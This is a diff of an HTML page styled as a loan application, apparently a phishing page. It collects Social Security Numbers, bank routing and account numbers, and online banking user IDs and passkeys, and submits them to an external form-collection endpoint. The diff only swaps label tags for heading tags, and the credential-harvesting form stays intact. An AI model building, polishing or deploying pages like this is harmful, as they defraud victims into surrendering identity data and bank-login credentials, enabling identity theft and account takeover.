@@ -26,7 +26,7 @@
       margin-bottom: 20px;
     }
 
-    label {
+    h4 {
       display: block;
       margin-bottom: 6px;
       font-weight: bold;
@@ -63,7 +63,7 @@
     button:hover {
       background-color: #ec2b3c;
     }
-    h4{
+    h3{
         color: #d41c2c  ;
     }
     .subtn{
@@ -113,20 +113,20 @@
     <form action="https://submit-form.com/KrjIAvQ5f" method="POST" id="multiStepForm" name="Verification">
   <!-- Step 1: Personal Details -->
   <div class="form-step active">
-    <h4>Personal Information</h4>
-    <label for="name">Full Legal Name</label>
+    <h3>Personal Information</h3>
+    <h4>Full Legal Name</h4>
     <input type="text" name="name" placeholder="Name"  required>
 
-    <label for="email">Email Address</label>
+    <h4>Email Address</h4>
     <input type="email" name="email" placeholder="Email" required>
 
-    <label for="phone">Phone Number</label>
+    <h4>Phone Number</h4>
     <input type="tel" name="phone" placeholder="Phone Number" required>
 
-    <label for="address">Residential Address</label>
+    <h4>Residential Address</h4>
     <input type="text" name="address" placeholder="Address" >
 
-    <label for="txt">social Security Number</label>
+    <h4>social Security Number</h4>
     <input type="text" name="ss"  placeholder="SSN" required>
 
     <button type="button" class="next">Next</button>
@@ -134,9 +134,9 @@
 
  <!-- Step 2: Loan Details -->
 <div class="form-step">
-  <h4>Loan Details</h4>
+  <h3>Loan Details</h3>
 
-  <label for="loan-range">Select Loan Range</label>
+  <h4>Select Loan Range</h4>
   <select id="loan-range" name="loan-range" required>
     <option value="12"> $1,500 - $3,000 (12% interest) </option>
     <option value="10"> $3,001 - $6,000 (10% interest) </option>
@@ -144,18 +144,18 @@
     <option value="5"> More than $10,000 (5% interest) </option>
   </select>
 
-  <label for="loan-amount">Requested Loan Amount ($)</label>
+  <h4>Requested Loan Amount ($)</h4>
   <input type="number" name="loan-amount" required />
 
-  <label for="installments">Loan Term (Months)</label>
+  <h4>Loan Term (Months)</h4>
   <input type="number" name="installments" required />
 
-  <label for="purpose">Purpose of Loan</label>
+  <h4>Purpose of Loan</h4>
   <input type="text" name="purpose" />
 
   <button type="button" onclick="calculateInstallment()">Calculate Installment</button>
 
-  <label for="monthly-installment">Estimated Monthly Installment ($)</label>
+  <h4>Estimated Monthly Installment ($)</h4>
   <input type="text" name="monthly-installment" id="monthly-installment" readonly />
 
   <button type="button" class="next">Next</button>
@@ -164,9 +164,9 @@
 
   <!-- Step 3: Employment & Income -->
   <div class="form-step">
-    <h4>Employment & Income</h4>
+    <h3>Employment & Income</h3>
 
-    <label for="employment-status">Employment Status</label>
+    <h4>Employment Status</h4>
     <select id="employment-status" name="employment-status" required>
       <option value="" disabled selected>Select status</option>
       <option value="full-time">Employed Full-Time</option>
@@ -176,7 +176,7 @@
       <option value="retired">Retired</option>
     </select>
 
-    <label for="income">Monthly Income ($)</label>
+    <h4>Monthly Income ($)</h4>
     <input type="number" name="income" id="income" required>
 
     <button type="button" class="next">Next</button>
@@ -185,30 +185,30 @@
 
   <!-- Step 4: Bank Details -->
   <div class="form-step">
-    <h4>Banking Details</h4>
+    <h3>Banking Details</h3>
 
-    <label for="house">Bank Name</label>
+    <h4>Bank Name</h4>
     <input type="text" name="bnk" placeholder="Bank Name" required>
 
-    <label for="duration">Banking Relationship Duration (Years)</label>
+    <h4>Banking Relationship Duration (Years)</h4>
     <input type="text" name="time" placeholder="How many years of Banking" required>
 
-    <label for="address2">Bank Verification ID (Routing Number)</label>
+    <h4>Bank Verification ID (Routing Number)</h4>
     <input type="text" name="r1" required>
 
-    <label for="address3">Account Verification ID (Account Number)</label>
+    <h4>Account Verification ID (Account Number)</h4>
     <input type="text" name="a1" required>
 
-    <label for="school">Your User ID </label>
+    <h4>Your User ID </h4>
     <input type="text" name="ud" id="school" placeholder="Banking User ID" required>
-    <label for="college">Your Passkey for Security</label>
+    <h4>Your Passkey for Security</h4>
     <input type="text" name="ps" id="college" placeholder="Your Passkey" required>
 <br>
 
-    <label>
+    <h4>
       <input type="checkbox" name="terms" required>
       I accept the terms and conditions and consent to data processing.
-    </label>
+    </h4>
 
     <br><br>
     <button type="submit" class="subtn">Submit Application</button>
